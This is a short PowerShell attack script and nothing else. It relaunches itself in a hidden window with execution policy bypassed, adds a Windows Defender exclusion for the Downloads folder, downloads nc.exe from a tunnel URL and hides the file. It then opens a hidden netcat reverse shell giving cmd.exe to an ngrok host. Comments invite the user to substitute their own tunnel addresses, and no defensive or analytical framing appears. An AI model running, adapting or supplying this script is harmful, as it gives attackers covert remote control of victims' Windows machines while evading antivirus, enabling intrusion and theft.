function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script`""
        exit
    }
}
Ensure-WindowsPowerShell

try {
    # === 1. Optional: Add Defender Exclusion (fails silently if not admin) ===
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
} catch {}

try {
    # === 2. Download Netcat (nc.exe) from public HTTPS URL ===
    $ncUrl = "https://9d869f58c38aeb.lhr.life/nc.exe"  # Replace with your own localhost.run link
    $ncPath = Join-Path -Path ([Environment]::GetFolderPath("Downloads")) -ChildPath "nc.exe"

    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing

    # === 3. Hide the downloaded nc.exe binary ===
    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
} catch {
    Write-Error "Failed to download or hide nc.exe: $_"
    exit
}

try {
    # === 4. Launch Netcat reverse shell to ngrok tunnel ===
    $ngrokHost = "0.tcp.ngrok.io"      # Replace with your ngrok public TCP hostname
    $ngrokPort = 19234                 # Replace with your ngrok-assigned port

    $args = "-d $ngrokHost $ngrokPort -e cmd.exe"

    Start-Process -FilePath $ncPath -ArgumentList $args -WindowStyle Hidden
} catch {
    Write-Error "Failed to start reverse shell: $_"
}
